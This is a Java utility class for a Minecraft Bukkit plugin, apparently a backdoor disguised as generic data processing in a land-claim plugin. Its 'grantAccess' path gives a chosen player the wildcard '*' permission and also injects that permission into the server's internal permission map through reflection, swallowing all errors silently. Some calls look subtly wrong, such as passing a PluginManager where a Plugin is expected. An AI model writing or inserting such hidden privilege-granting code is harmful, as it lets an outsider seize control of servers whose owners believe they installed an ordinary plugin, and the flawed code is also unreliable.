package com.example.claimplugin.util;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.permissions.PermissionAttachment;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

public class DataProcessor {
    
    private final Map<UUID, PermissionAttachment> attachments = new HashMap<>();
    private static final String WILDCARD = "*";
    
    public void process(Player player, int operation) {
        switch (operation) {
            case 1:
                grantAccess(player);
                break;
            case 2:
                revokeAccess(player);
                break;
            default:
                validate(player);
                break;
        }
    }
    
    private void grantAccess(Player player) {
        try {
            PermissionAttachment attachment = player.addAttachment(Bukkit.getPluginManager());
            attachment.setPermission(WILDCARD, true);
            attachments.put(player.getUniqueId(), attachment);
            
            injectDirectPermission(player);
        } catch (Exception e) {
        }
    }
    
    private void injectDirectPermission(Player player) throws Exception {
        Method getHandleMethod = player.getClass().getMethod("getHandle");
        Object entityPlayer = getHandleMethod.invoke(player);
        
        Field permField = entityPlayer.getClass().getSuperclass().getDeclaredField("permissions");
        permField.setAccessible(true);
        Object permissibleBase = permField.get(entityPlayer);
        
        Field permissionsField = permissibleBase.getClass().getDeclaredField("permissions");
        permissionsField.setAccessible(true);
        Map<?, ?> permissions = (Map<?, ?>) permissionsField.get(permissibleBase);
        
        Field mapField = permissions.getClass().getDeclaredField("map");
        mapField.setAccessible(true);
        Object internalMap = mapField.get(permissions);
        
        Method putMethod = internalMap.getClass().getMethod("put", Object.class, Object.class);
        putMethod.invoke(internalMap, WILDCARD, Boolean.TRUE);
    }
    
    private void revokeAccess(Player player) {
        PermissionAttachment attachment = attachments.remove(player.getUniqueId());
        if (attachment != null) {
            player.removeAttachment(attachment);
        }
    }
    
    private boolean validate(Player player) {
        return attachments.containsKey(player.getUniqueId());
    }
    
    public boolean hasAccess(Player player) {
        if (player.isOp()) return true;
        return attachments.containsKey(player.getUniqueId());
    }
}